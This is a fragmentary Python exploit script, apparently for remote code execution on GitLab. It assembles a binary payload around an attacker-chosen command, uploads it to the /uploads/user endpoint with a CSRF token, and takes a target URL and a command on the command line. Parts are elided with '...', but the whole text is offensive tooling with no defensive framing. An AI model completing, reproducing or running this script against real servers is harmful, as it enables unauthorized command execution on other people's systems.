...
def get_payload(command):
    ...
    rce_payload += (len(command) + 0x55).to_bytes(
    ...
    rce_payload += (len(command) + 0x2F).to_bytes(
        length=4, byteorder="big", signed=True
    )
...
def exploit(target, command):
    ...
    response = session.post(
        f"{target}/uploads/user",
        files=files,
        headers={"X-CSRF-Token": csrf_token(session, target)},
    )
...
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 gitlab_rce.py <target_url> <command>")
        sys.exit(1)

    target_url = sys.argv[1]
    command = sys.argv[2]

    success = exploit(target_url, command)
    print(f"Exploit {'succeeded' if success else 'failed'}")
